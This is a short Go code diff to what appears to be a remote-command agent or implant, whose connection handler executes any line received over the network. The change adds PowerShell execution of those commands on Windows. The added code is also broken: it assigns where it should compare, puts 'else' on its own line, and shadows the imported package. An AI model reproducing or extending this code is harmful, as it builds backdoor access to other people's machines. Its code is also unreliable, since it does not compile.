@@ -9,6 +9,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"runtime"
 	"strings"
 	"time"
 )
@@ -113,6 +114,7 @@ func writeData(Beacon bool, result string) string {
 
 func handleConnection(conn net.Conn) {
 	buffer, err := bufio.NewReader(conn).ReadString('\n')
+	os := runtime.GOOS
 
 	if err != nil {
 		fmt.Println("Failed to read from reader.")
@@ -123,7 +125,12 @@ func handleConnection(conn net.Conn) {
 	//todo: seperate command and args
 	//print(newCmd)
 	buffer = strings.Replace(buffer, "\n", "", -1)
-	command, err := exec.Command(buffer).Output()
+	if os = "windows"{
+		command, err := exec.Command("powershell.exe","/c",buffer).Output()
+	}
+	else{
+		command, err := exec.Command(buffer).Output()
+	}
 
 	if err != nil {
 		fmt.Println(err)
